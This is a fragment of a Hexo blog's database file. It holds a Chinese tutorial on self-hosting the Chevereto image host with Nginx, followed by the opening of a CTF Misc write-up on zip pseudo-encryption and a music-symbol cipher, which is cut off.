ustifiedGallery.min.css","hash":"82f2cbe45882f86427a9ff36ee93b2ba9a31452f","modified":1640858898844},{"_id":"public/css/style.css","hash":"286ac56f094a9c9e4ff403111d2d608da218e2a0","modified":1640858898844},{"_id":"public/images/logo.png","hash":"0e3029251dfda26adee2761f71377297e8c26871","modified":1640858898844},{"_id":"public/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"ad8f48b4022498078b089fcdd1e8b47faf496931","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"b7d24ab1e4fad720f31a2b0cca1904ce1740d846","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"b542b9591fbf33925d93f0695b6e123a9f0cfd43","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"926035f0156cccf1b0ca507347f39bf9c510f51e","modified":1640858898844},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"1b7f2fb5f3110512c9eb245958bc87f2e9992927","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"93ebc5098cf57a32b7b8d297681f31692c09bdfa","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"9a23c6898b0943bd3d96c04df9a0f66e919451d8","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"9d757cc9f928fc83b2133283dd639c12b11d94ad","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"34f7db59f1d023294e69976aa20b7d52b86165a4","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"58be4b7760e9a84daa81929d046f9a15c4fd1c1a","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"6c090d6bff3928fbf8a5f4104e58ed7f421aea7c","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"20ce1fc7ae1254558ca044ae48283faaa58897e5","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"f9918fb93d6ab6850f5d38069a999c311af78816","modified":1640858898844},{"_id":"public/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"de559f8d70d5b1ab2810597bfd0b1b9506f3ef01","modified":1640858898844},{"_id":"public/lib/jquery/jquery.min.js","hash":"b82d238d4e31fdf618bae8ac11a6c812c03dd0d4","modified":1640858898844},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.svg","hash":"201f1f1e7e22aacadcf8050816a15a584fc9d135","modified":1640858898844},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.svg","hash":"e9f30a24d1ccf44af5ba29a7c26e41af6dc92e9d","modified":1640858898844},{"_id":"public/archives/2021/04/index.html","hash":"449b1527cfcdd788625099b9b0d7293125251d31","modified":1640858898844},{"_id":"public/2021/04/16/[WUSTCTF2020]朴实无华/index.html","hash":"b3f92ab5b8fff716b1c14e0cc96b993678ee214f","modified":1640858898844},{"_id":"public/2021/04/15/[SWPU2019]Web1/index.html","hash":"057c4dca556c29f52b0437c92fd38d27da2fecfb","modified":1640858898844},{"_id":"public/2020/09/22/sql-labs1/index.html","hash":"5d40888299e2780bc915a5e077300c720b26d1ec","modified":1640858898844},{"_id":"public/2021/04/18/[极客大挑战 2019]FinalSQL/index.html","hash":"90933fc301b3576a2445d6a2fa8aca251e3dc51c","modified":1640858898844},{"_id":"public/2020/12/04/[GXYCTF2019]Ping Ping Ping/index.html","hash":"654987ed6b9b70627d6a260020d14cdd7deff0d8","modified":1640858898844},{"_id":"public/archives/2020/page/3/index.html","hash":"4f13922f2ad92775f82c8d3b655bce002d6a5745","modified":1640858898844},{"_id":"public/archives/2020/11/page/2/index.html","hash":"7b2f204aab5c8ad0b86177882dd2d923464edc5d","modified":1640858898844},{"_id":"public/archives/2021/01/index.html","hash":"1cb3aab0f9e384ed6c1ad015c12eafc852558d55","modified":1640858898844},{"_id":"public/2021/04/20/ReadlezPHP&EasySearch/index.html","hash":"9e40ed738ac7a1eeb20191b6c59ec20a84de4b98","modified":1640858898844},{"_id":"public/2021/01/18/BUUCTF寒假刷题-Web/index.html","hash":"2199c1f3bef3195aaaa12b7841f1cb92a06706ed","modified":1640858898844},{"_id":"public/2020/11/29/DMCTF之Web/index.html","hash":"9fceb492f2264c273e2978c8d86fa34e8ad18382","modified":1640858898844},{"_id":"public/2020/11/09/Upload-Labs2/index.html","hash":"d2631c44327a71a71c0c870f542fca8dde0eb8be","modified":1640858898844},{"_id":"public/2020/11/08/Upload-Labs1/index.html","hash":"f0bbfeeb982cf40f5a4a05925d8c77772d349a94","modified":1640858898844},{"_id":"public/2020/11/03/XSS-Lab1/index.html","hash":"091d9a77431cee1651cb31daae18cab73fe6f242","modified":1640858898844},{"_id":"themes/cactus/layout/_partial/comments.bak","hash":"4cf8d0059e5f8bc8ae1dd1a426293583fd398052","modified":1620840000000},{"_id":"themes/cactus/bak/_partial/comments.bak","hash":"4cf8d0059e5f8bc8ae1dd1a426293583fd398052","modified":1620840000000},{"_id":"themes/cactus/bak/_partial/comments.ejs","hash":"fc4bc4421f2ed388b30fd3e63cba30f66c0df331","modified":1640857374209},{"_id":"themes/cactus/bak/_partial/scripts.ejs","hash":"0d452e8b996802212b5f8e162ac06d4af21d4a49","modified":1640857374209},{"_id":"public/README.md","hash":"5812d3058157755992b3d8c7ae480baa67a786fc","modified":1640858898844},{"_id":"source/_posts/CISCN线上赛库存.md","hash":"ed842d18a61e45d2c5ae0da1eec5973f4fde2578","modified":1640857374175},{"_id":"public/2021/08/18/CISCN线上赛库存/index.html","hash":"1f0290113c328cbc17d22914e0aeed8158b75661","modified":1640858898844},{"_id":"public/archives/2021/08/index.html","hash":"b739eee98e48b1aab88f77aa225a50f7cf405331","modified":1640858898844},{"_id":"public/tags/web/index.html","hash":"9415d08051f7877450797db4f13e91fae4f09b42","modified":1640858898844},{"_id":"public/tags/php原生类/index.html","hash":"4b4214034aee61f781b56bb4699be2828ecb3f5f","modified":1640858898844},{"_id":"source/categories/index.md","hash":"5a348ab769bef36c60c8cb32d81752e76779c0b3","modified":1640857374205},{"_id":"source/tags/index.md","hash":"e4588ce3751098f9a54ff8b8a0a3dff60624d628","modified":1640857374206},{"_id":"public/categories/index.html","hash":"52ccd70c54cda3cb7bf625d5e6771174ee1fdd34","modified":1640858898844},{"_id":"public/tags/index.html","hash":"c36fb2608cf24e8be73421d55007f21e212f1f16","modified":1640858898844}],"Category":[{"name":"服务器","_id":"ckrr3f9al0004hotccqfpd9c6"},{"name":"CTF","_id":"ckrr3f9ap000ahotc63kn91ae"},{"name":"捣腾博客","_id":"ckrr3f9ay000shotcfuqv7z87"},{"name":"DROPS","_id":"ckrr3f9b1000zhotcgjnsc5m1"},{"name":"流水账","_id":"ckrr3f9bf0023hotcf3f99o1e"},{"name":"分享","_id":"ckrr3f9bh002bhotcf0lq014w"}],"Data":[],"Page":[{"_content":"# guobang-yoo.github.io","source":"README.md","raw":"# guobang-yoo.github.io","date":"2021-07-26T09:19:06.053Z","updated":"2021-07-26T09:19:06.053Z","path":"README.html","title":"","comments":1,"layout":"page","_id":"ckrr3f9ad0000hotcbz00a85i","content":"<h1 id=\"guobang-yoo-github-io\"><a href=\"#guobang-yoo-github-io\" class=\"headerlink\" title=\"guobang-yoo.github.io\"></a>guobang-yoo.github.io</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"guobang-yoo-github-io\"><a href=\"#guobang-yoo-github-io\" class=\"headerlink\" title=\"guobang-yoo.github.io\"></a>guobang-yoo.github.io</h1>"},{"title":"Search","type":"search","_content":"","source":"search/index.md","raw":"---\ntitle: Search\ntype: search\n---\n","date":"2021-12-30T09:42:54.205Z","updated":"2021-12-30T09:42:54.205Z","path":"search/index.html","_id":"ckrr3f9ai0002hotc6xls5n3h","comments":1,"layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"about","date":"2021-07-26T11:53:41.000Z","_content":"\n为世界上所有的美好而战","source":"about/index.md","raw":"---\ntitle: about\ndate: 2021-07-26 19:53:41\n---\n\n为世界上所有的美好而战","updated":"2021-12-30T09:42:54.204Z","path":"about/index.html","_id":"ckrr3f9am0006hotcba4w9nbq","comments":1,"layout":"page","content":"<p>为世界上所有的美好而战</p>\n","site":{"data":{}},"excerpt":"","more":"<p>为世界上所有的美好而战</p>\n"},{"title":"categories","type":"categories","date":"2021-08-27T03:16:52.000Z","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ntype: categories\ndate: 2021-08-27 11:16:52\n---\n","updated":"2021-12-30T09:42:54.205Z","path":"categories/index.html","_id":"ckstsboo400009otcfkyc38h1","comments":1,"layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","type":"tags","date":"2021-08-27T03:16:24.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ntype: tags\ndate: 2021-08-27 11:16:24\n---\n","updated":"2021-12-30T09:42:54.206Z","path":"tags/index.html","_id":"ckstsboo700019otc4v74bq4y","comments":1,"layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Chevereto-搭建一个自己的图床","date":"2020-09-20T03:09:02.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120851.jpg","_content":"\n​\t博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章~~越写越多~~用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到~~限制~~，正好发现了`Chevereto`这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。\n\n### Chevereto 说明\n\n>Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。\n\n`Chevereto`分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣\n\n### 环境说明\n\n因为`Chevereto`所需要的环境为\n\n* Apache/Nginx\n\n* PHP 5.5+\n\n* MySQL 5.0+\n\n~~我太懒了不想动~~所以我选择使用宝塔面板为我们搭建web环境。\n\n宝塔面板官网：https://www.bt.cn/\n\n安装完成以后进入管理面板应该会直接提示你安装需要的环境\n\n我的环境如下图\n\n![BJ9TVP.png](https://s1.ax1x.com/2020/10/29/BJ9TVP.png)\n\n### 总结安装步骤\n\n1. 去github下载Chevereto的压缩包。\n2. 在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。\n3. 将Chevereto的压缩包上传到网站目录解压。\n4. 访问新建的网站就是Chevereto的管理面板，并进行初始配置。\n5. 无了。\n\n### 开始\n\n* [github下载地址](https://github.com/Chevereto/Chevereto-Free/releases)\n\n* 创建网站目录和数据库用户\n\n![BJ9H58.png](https://s1.ax1x.com/2020/10/29/BJ9H58.png)\n\n因为我域名所以域名留空，提示默认使用`80`端口，访问地址就是服务器ip地址，剩下的自己随机发挥。\n\n* 创建完成后需要配置一下网站配置文件才可以访问到配置页面。\n\n![BJ9Ibt.png](https://s1.ax1x.com/2020/10/29/BJ9Ibt.png)\n\n![BJ9qPS.png](https://s1.ax1x.com/2020/10/29/BJ9qPS.png)\n\n在`server{...}`中添加\n\n```nginx\nlocation / {\ntry_files $uri $uri/ /index.php?$query_string;\n}\n```\n\n配置完成以后应该会自动保存并重启`Nginx`。\n\n* 将在github上下载的`Chevereto`压缩包上传到刚刚创建的网站目录中（上图是`/www/wwwroot`）并解压。\n\n之后就可以直接访问`服务器ip:80`（80端口可以省略），然后一步一步的进行配置。\n\n**可能会出现的错误**\n\n> `Chevereto can’t create the app/settings.php file. You must manually create this file`\n\n解决方法：这个错误就是没有找到`setting.php`配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在`Chevereto`的网站目录下的`/app`目录下执行命令创建文件，并修改文件权限\n\n```shell\ntouch settings.php\nchmod +x settings.php\n```\n\n> 我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。\n\n* 访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。\n\n\n![BJ97Uf.jpg](https://s1.ax1x.com/2020/10/29/BJ97Uf.jpg)\n\n![BJ9O2Q.jpg](https://s1.ax1x.com/2020/10/29/BJ9O2Q.jpg)\n\n完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。\n\n### 完工\n\n管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习\n\n然后我的图床地址：http://47.97.231.10/ (已失效)    ~~🈚👇👻来丶se兔~~\n\n","source":"_posts/Chevereto-搭建一个自己的图床.md","raw":"---\ntitle: Chevereto-搭建一个自己的图床\ndate: 2020-09-20 11:09:02\ncategories:\n- 服务器\ntags:\n- 图床\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120851.jpg\n---\n\n​\t博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章~~越写越多~~用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到~~限制~~，正好发现了`Chevereto`这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。\n\n### Chevereto 说明\n\n>Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。\n\n`Chevereto`分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣\n\n### 环境说明\n\n因为`Chevereto`所需要的环境为\n\n* Apache/Nginx\n\n* PHP 5.5+\n\n* MySQL 5.0+\n\n~~我太懒了不想动~~所以我选择使用宝塔面板为我们搭建web环境。\n\n宝塔面板官网：https://www.bt.cn/\n\n安装完成以后进入管理面板应该会直接提示你安装需要的环境\n\n我的环境如下图\n\n![BJ9TVP.png](https://s1.ax1x.com/2020/10/29/BJ9TVP.png)\n\n### 总结安装步骤\n\n1. 去github下载Chevereto的压缩包。\n2. 在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。\n3. 将Chevereto的压缩包上传到网站目录解压。\n4. 访问新建的网站就是Chevereto的管理面板，并进行初始配置。\n5. 无了。\n\n### 开始\n\n* [github下载地址](https://github.com/Chevereto/Chevereto-Free/releases)\n\n* 创建网站目录和数据库用户\n\n![BJ9H58.png](https://s1.ax1x.com/2020/10/29/BJ9H58.png)\n\n因为我域名所以域名留空，提示默认使用`80`端口，访问地址就是服务器ip地址，剩下的自己随机发挥。\n\n* 创建完成后需要配置一下网站配置文件才可以访问到配置页面。\n\n![BJ9Ibt.png](https://s1.ax1x.com/2020/10/29/BJ9Ibt.png)\n\n![BJ9qPS.png](https://s1.ax1x.com/2020/10/29/BJ9qPS.png)\n\n在`server{...}`中添加\n\n```nginx\nlocation / {\ntry_files $uri $uri/ /index.php?$query_string;\n}\n```\n\n配置完成以后应该会自动保存并重启`Nginx`。\n\n* 将在github上下载的`Chevereto`压缩包上传到刚刚创建的网站目录中（上图是`/www/wwwroot`）并解压。\n\n之后就可以直接访问`服务器ip:80`（80端口可以省略），然后一步一步的进行配置。\n\n**可能会出现的错误**\n\n> `Chevereto can’t create the app/settings.php file. You must manually create this file`\n\n解决方法：这个错误就是没有找到`setting.php`配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在`Chevereto`的网站目录下的`/app`目录下执行命令创建文件，并修改文件权限\n\n```shell\ntouch settings.php\nchmod +x settings.php\n```\n\n> 我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。\n\n* 访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。\n\n\n![BJ97Uf.jpg](https://s1.ax1x.com/2020/10/29/BJ97Uf.jpg)\n\n![BJ9O2Q.jpg](https://s1.ax1x.com/2020/10/29/BJ9O2Q.jpg)\n\n完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。\n\n### 完工\n\n管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习\n\n然后我的图床地址：http://47.97.231.10/ (已失效)    ~~🈚👇👻来丶se兔~~\n\n","slug":"Chevereto-搭建一个自己的图床","published":1,"updated":"2021-12-30T09:42:54.175Z","_id":"ckrr3f9af0001hotccrle89hv","comments":1,"layout":"post","photos":[],"link":"","content":"<p>​    博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章<del>越写越多</del>用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到<del>限制</del>，正好发现了<code>Chevereto</code>这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。</p>\n<h3 id=\"Chevereto-说明\"><a href=\"#Chevereto-说明\" class=\"headerlink\" title=\"Chevereto 说明\"></a>Chevereto 说明</h3><blockquote>\n<p>Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。</p>\n</blockquote>\n<p><code>Chevereto</code>分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣</p>\n<h3 id=\"环境说明\"><a href=\"#环境说明\" class=\"headerlink\" title=\"环境说明\"></a>环境说明</h3><p>因为<code>Chevereto</code>所需要的环境为</p>\n<ul>\n<li><p>Apache/Nginx</p>\n</li>\n<li><p>PHP 5.5+</p>\n</li>\n<li><p>MySQL 5.0+</p>\n</li>\n</ul>\n<p><del>我太懒了不想动</del>所以我选择使用宝塔面板为我们搭建web环境。</p>\n<p>宝塔面板官网：<a href=\"https://www.bt.cn/\">https://www.bt.cn/</a></p>\n<p>安装完成以后进入管理面板应该会直接提示你安装需要的环境</p>\n<p>我的环境如下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9TVP.png\" alt=\"BJ9TVP.png\"></p>\n<h3 id=\"总结安装步骤\"><a href=\"#总结安装步骤\" class=\"headerlink\" title=\"总结安装步骤\"></a>总结安装步骤</h3><ol>\n<li>去github下载Chevereto的压缩包。</li>\n<li>在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。</li>\n<li>将Chevereto的压缩包上传到网站目录解压。</li>\n<li>访问新建的网站就是Chevereto的管理面板，并进行初始配置。</li>\n<li>无了。</li>\n</ol>\n<h3 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h3><ul>\n<li><p><a href=\"https://github.com/Chevereto/Chevereto-Free/releases\">github下载地址</a></p>\n</li>\n<li><p>创建网站目录和数据库用户</p>\n</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9H58.png\" alt=\"BJ9H58.png\"></p>\n<p>因为我域名所以域名留空，提示默认使用<code>80</code>端口，访问地址就是服务器ip地址，剩下的自己随机发挥。</p>\n<ul>\n<li>创建完成后需要配置一下网站配置文件才可以访问到配置页面。</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9Ibt.png\" alt=\"BJ9Ibt.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9qPS.png\" alt=\"BJ9qPS.png\"></p>\n<p>在<code>server&#123;...&#125;</code>中添加</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\"><span class=\"attribute\">try_files</span> $uri $uri/ /index.php?$query_string;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>配置完成以后应该会自动保存并重启<code>Nginx</code>。</p>\n<ul>\n<li>将在github上下载的<code>Chevereto</code>压缩包上传到刚刚创建的网站目录中（上图是<code>/www/wwwroot</code>）并解压。</li>\n</ul>\n<p>之后就可以直接访问<code>服务器ip:80</code>（80端口可以省略），然后一步一步的进行配置。</p>\n<p><strong>可能会出现的错误</strong></p>\n<blockquote>\n<p><code>Chevereto can’t create the app/settings.php file. You must manually create this file</code></p>\n</blockquote>\n<p>解决方法：这个错误就是没有找到<code>setting.php</code>配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在<code>Chevereto</code>的网站目录下的<code>/app</code>目录下执行命令创建文件，并修改文件权限</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch settings.php</span><br><span class=\"line\">chmod +x settings.php</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。</p>\n</blockquote>\n<ul>\n<li>访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ97Uf.jpg\" alt=\"BJ97Uf.jpg\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9O2Q.jpg\" alt=\"BJ9O2Q.jpg\"></p>\n<p>完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。</p>\n<h3 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h3><p>管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习</p>\n<p>然后我的图床地址：<a href=\"http://47.97.231.10/\">http://47.97.231.10/</a> (已失效)    <del>🈚👇👻来丶se兔</del></p>\n","site":{"data":{}},"excerpt":"","more":"<p>​    博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章<del>越写越多</del>用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到<del>限制</del>，正好发现了<code>Chevereto</code>这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。</p>\n<h3 id=\"Chevereto-说明\"><a href=\"#Chevereto-说明\" class=\"headerlink\" title=\"Chevereto 说明\"></a>Chevereto 说明</h3><blockquote>\n<p>Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。</p>\n</blockquote>\n<p><code>Chevereto</code>分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣</p>\n<h3 id=\"环境说明\"><a href=\"#环境说明\" class=\"headerlink\" title=\"环境说明\"></a>环境说明</h3><p>因为<code>Chevereto</code>所需要的环境为</p>\n<ul>\n<li><p>Apache/Nginx</p>\n</li>\n<li><p>PHP 5.5+</p>\n</li>\n<li><p>MySQL 5.0+</p>\n</li>\n</ul>\n<p><del>我太懒了不想动</del>所以我选择使用宝塔面板为我们搭建web环境。</p>\n<p>宝塔面板官网：<a href=\"https://www.bt.cn/\">https://www.bt.cn/</a></p>\n<p>安装完成以后进入管理面板应该会直接提示你安装需要的环境</p>\n<p>我的环境如下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9TVP.png\" alt=\"BJ9TVP.png\"></p>\n<h3 id=\"总结安装步骤\"><a href=\"#总结安装步骤\" class=\"headerlink\" title=\"总结安装步骤\"></a>总结安装步骤</h3><ol>\n<li>去github下载Chevereto的压缩包。</li>\n<li>在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。</li>\n<li>将Chevereto的压缩包上传到网站目录解压。</li>\n<li>访问新建的网站就是Chevereto的管理面板，并进行初始配置。</li>\n<li>无了。</li>\n</ol>\n<h3 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h3><ul>\n<li><p><a href=\"https://github.com/Chevereto/Chevereto-Free/releases\">github下载地址</a></p>\n</li>\n<li><p>创建网站目录和数据库用户</p>\n</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9H58.png\" alt=\"BJ9H58.png\"></p>\n<p>因为我域名所以域名留空，提示默认使用<code>80</code>端口，访问地址就是服务器ip地址，剩下的自己随机发挥。</p>\n<ul>\n<li>创建完成后需要配置一下网站配置文件才可以访问到配置页面。</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9Ibt.png\" alt=\"BJ9Ibt.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9qPS.png\" alt=\"BJ9qPS.png\"></p>\n<p>在<code>server&#123;...&#125;</code>中添加</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\"><span class=\"attribute\">try_files</span> $uri $uri/ /index.php?$query_string;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>配置完成以后应该会自动保存并重启<code>Nginx</code>。</p>\n<ul>\n<li>将在github上下载的<code>Chevereto</code>压缩包上传到刚刚创建的网站目录中（上图是<code>/www/wwwroot</code>）并解压。</li>\n</ul>\n<p>之后就可以直接访问<code>服务器ip:80</code>（80端口可以省略），然后一步一步的进行配置。</p>\n<p><strong>可能会出现的错误</strong></p>\n<blockquote>\n<p><code>Chevereto can’t create the app/settings.php file. You must manually create this file</code></p>\n</blockquote>\n<p>解决方法：这个错误就是没有找到<code>setting.php</code>配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在<code>Chevereto</code>的网站目录下的<code>/app</code>目录下执行命令创建文件，并修改文件权限</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch settings.php</span><br><span class=\"line\">chmod +x settings.php</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。</p>\n</blockquote>\n<ul>\n<li>访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。</li>\n</ul>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ97Uf.jpg\" alt=\"BJ97Uf.jpg\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9O2Q.jpg\" alt=\"BJ9O2Q.jpg\"></p>\n<p>完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。</p>\n<h3 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h3><p>管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习</p>\n<p>然后我的图床地址：<a href=\"http://47.97.231.10/\">http://47.97.231.10/</a> (已失效)    <del>🈚👇👻来丶se兔</del></p>\n"},{"title":"DMCTF之Misc","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232221.png","date":"2020-12-01T03:20:45.000Z","_content":"\n\n# 前言\n\n这次比赛是第一次做Mics的题awa。\n\n# Misc\n\n## Check_in\n\n真·有手就行\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130102716.png)\n\n## fakezip\n\n看到题目**fakezip**翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：[zip伪加密](https://blog.csdn.net/u011377996/article/details/79286958)，使用010 Editor打开压缩包，\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130103932.png)\n\n找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt\n\n打开以后内容是：`♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=`，音符加密虽然是第一次听说，但是百度还是可以简单找到：[文本加密为音乐符号](https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130104321.png)\n\n## Base 